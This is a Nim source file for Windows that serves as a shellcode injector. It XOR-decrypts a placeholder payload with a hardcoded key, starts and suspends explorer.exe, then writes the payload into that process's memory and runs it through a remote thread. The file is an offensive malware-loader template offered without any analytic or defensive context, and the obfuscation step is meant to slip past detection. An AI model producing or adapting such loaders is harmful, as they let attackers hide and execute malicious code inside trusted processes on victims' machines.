import winim/lean
import osproc


let encryptedsc: seq[byte] = @[ # Insert here encrypted shellcode   ]
let key: seq[byte] = @[0x6d, 0x79, 0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x6b, 0x65, 0x79]
let sclen = encryptedsc.len
 
 
proc xorEncryptDecrypt(data: seq[byte], key: seq[byte]): seq[byte] =
    var encrypted: seq[byte]
    for i in 0 ..< len(data):
        encrypted.add(data[i] xor key[i mod len(key)])
    result = encrypted
  

when isMainModule:
    let injectedProcess = startProcess("explorer.exe")
    injectedProcess.suspend()
    let processHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        false,
        cast[DWORD](injectedProcess.processID)
    )

    let memPointer = VirtualAllocEx(
        processHandle,
        NULL,
        cast[SIZE_T](sclen),
        MEM_COMMIT,
        PAGE_EXECUTE_READ
    )
    let shellcode = xorEncryptDecrypt(encryptedsc, key)
    var bytesWritten: SIZE_T
    WriteProcessMemory(
        processHandle,
        memPointer,
        addr shellcode[0],
        cast[SIZE_T](sclen),
        addr bytesWritten
    )
    CreateRemoteThread(
        processHandle,
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](memPointer),
        NULL,
        0,
        NULL
    )
